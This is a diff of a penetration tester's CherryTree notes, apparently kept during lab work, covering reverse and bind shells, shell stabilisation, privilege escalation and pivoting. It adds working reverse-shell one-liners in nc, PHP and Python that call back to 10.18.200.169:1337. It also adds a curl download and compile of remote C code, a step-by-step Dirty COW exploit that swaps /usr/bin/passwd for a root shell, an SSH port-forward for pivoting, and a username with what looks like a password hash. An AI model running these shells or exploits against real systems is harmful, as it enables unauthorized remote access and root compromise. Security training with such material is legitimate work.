@@ -859,25 +859,30 @@ After you’ve found leaked credentials, you can use KeyHacks (</rich_text>
 	</node>
 	<node custom_icon_id="0" foreground="" is_bold="False" name="exploit" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655471333.24" ts_lastsave="1655817747.98" unique_id="36">
 		<rich_text></rich_text>
-		<node custom_icon_id="0" foreground="" is_bold="False" name="command_injection_or_shell" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655471362.28" ts_lastsave="1655814591.42" unique_id="37">
+		<node custom_icon_id="0" foreground="" is_bold="False" name="command_injection_or_shell" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655471362.28" ts_lastsave="1655965678.03" unique_id="37">
 			<rich_text>Reverse
 
 nc 172.16.1.100 1234 -e /bin/sh
 
-php -r '$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'
+php -r '$sock=fsockopen(&quot;10.18.200.169&quot;,1337);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'
 
 mkfifo /tmp/f; nc &lt;LOCAL-IP&gt; &lt;PORT&gt; &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;1; rm /tmp/f
 
 powershell -c &quot;$client = New-Object System.Net.Sockets.TCPClient('&lt;ip&gt;',&lt;port&gt;);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot;
 
 bind shell
-mkfifo /tmp/f; nc -lvnp &lt;PORT&gt; &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;1; rm /tmp/f</rich_text>
+mkfifo /tmp/f; nc -lvnp &lt;PORT&gt; &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;1; rm /tmp/f
+
+python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.18.200.169&quot;,1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/sh&quot;)'
+
+</rich_text>
 		</node>
 	</node>
-	<node custom_icon_id="0" foreground="" is_bold="False" name="post_exploit_shell" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655814635.88" ts_lastsave="1655814635.88" unique_id="51">
+	<node custom_icon_id="0" foreground="" is_bold="False" name="post_exploit_shell" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655814635.88" ts_lastsave="1656313484.22" unique_id="51">
 		<rich_text>
 </rich_text>
-		<node custom_icon_id="0" foreground="" is_bold="False" name="shell_stabilizer" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655791685.61" ts_lastsave="1655814638.98" unique_id="45">
+		<rich_text link="webs https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</rich_text>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="shell_stabilizer" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655791685.61" ts_lastsave="1656222061.74" unique_id="45">
 			<rich_text>stable shell
 technique 1:
 
@@ -889,6 +894,16 @@ set_xterm
 			<rich_text family="monospace">export TERM=xterm</rich_text>
 			<rich_text> -- this will give us access to term commands such as </rich_text>
 			<rich_text family="monospace">clear</rich_text>
+			<rich_text>
+
+python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'; 
+</rich_text>
+			<rich_text family="monospace">export TERM=xterm</rich_text>
+			<rich_text>
+
+python3 -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'; 
+</rich_text>
+			<rich_text family="monospace">export TERM=xterm</rich_text>
 			<rich_text>
 
 lastly
@@ -936,9 +951,15 @@ and
 			<rich_text link="webs https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md</rich_text>
 			<rich_text>
 
-</rich_text>
+curl </rich_text>
+			<rich_text link="webs http:///test.c">http://10.18.200.169:8888/test.c</rich_text>
+			<rich_text> -o test.c
+gcc -z execstack test.c -o test
+
+
+minerva  | 0493a385607d679ae21364e3d2a45ef6</rich_text>
 		</node>
-		<node custom_icon_id="0" foreground="" is_bold="False" name="privesc" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655817747.98" ts_lastsave="1655877686.07" unique_id="52">
+		<node custom_icon_id="0" foreground="" is_bold="False" name="privesc" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655817747.98" ts_lastsave="1655990861.12" unique_id="52">
 			<rich_text>find SUID
 
 find / -perm -u=s -type f 2&gt;/dev/null
@@ -1551,7 +1572,7 @@ Use the key to login to the Debian VM as the root account:
 </rich_text>
 				<rich_text family="monospace">ssh -i root_key root@10.10.129.53</rich_text>
 			</node>
-			<node custom_icon_id="0" foreground="" is_bold="False" name="NFS" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655878494.36" ts_lastsave="1655878494.7" unique_id="67">
+			<node custom_icon_id="0" foreground="" is_bold="False" name="NFS" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655878494.36" ts_lastsave="1655878820.77" unique_id="67">
 				<rich_text>Files created via NFS inherit the </rich_text>
 				<rich_text weight="heavy">remote</rich_text>
 				<rich_text> user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the &quot;nobody&quot; user.
@@ -1593,6 +1614,38 @@ Back on the Debian VM, as the low privileged user account, execute the file to g
 				<rich_text>
 </rich_text>
 			</node>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="kernel_exploit" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655878820.77" ts_lastsave="1655878821.13" unique_id="68">
+				<rich_text>             Kernel exploits can leave the system in an unstable state, which is why you should only run them as a last resort.
+Run the </rich_text>
+				<rich_text weight="heavy">Linux Exploit Suggester 2</rich_text>
+				<rich_text> tool to identify potential kernel exploits on the current system:
+</rich_text>
+				<rich_text family="monospace">perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl</rich_text>
+				<rich_text>
+The popular Linux kernel exploit &quot;Dirty COW&quot; should be listed. Exploit code for Dirty COW can be found at </rich_text>
+				<rich_text weight="heavy">/home/user/tools/kernel-exploits/dirtycow/c0w.c</rich_text>
+				<rich_text>. It replaces the SUID file /usr/bin/passwd with one that spawns a shell (a backup of /usr/bin/passwd is made at /tmp/bak).
+Compile the code and run it (note that it may take several minutes to complete):
+</rich_text>
+				<rich_text family="monospace">gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
+./c0w</rich_text>
+				<rich_text>
+Once the exploit completes, run /usr/bin/passwd to gain a root shell:
+</rich_text>
+				<rich_text family="monospace">/usr/bin/passwd</rich_text>
+				<rich_text>
+Remember to restore the original </rich_text>
+				<rich_text weight="heavy">/usr/bin/passwd</rich_text>
+				<rich_text> file and exit the root shell before continuing!
+</rich_text>
+				<rich_text family="monospace">mv /tmp/bak /usr/bin/passwd
+exit</rich_text>
+				<rich_text>
+        </rich_text>
+			</node>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="pivoting" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1656313484.22" ts_lastsave="1656313486.69" unique_id="69">
+			<rich_text>sudo ssh -N -L 0.0.0.0:80:192.168.1.105:80 wtf@10.1.2.114 </rich_text>
 		</node>
 	</node>
 	<node custom_icon_id="0" foreground="" is_bold="False" name="tests" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394210.03" ts_lastsave="1655727693.85" unique_id="19">
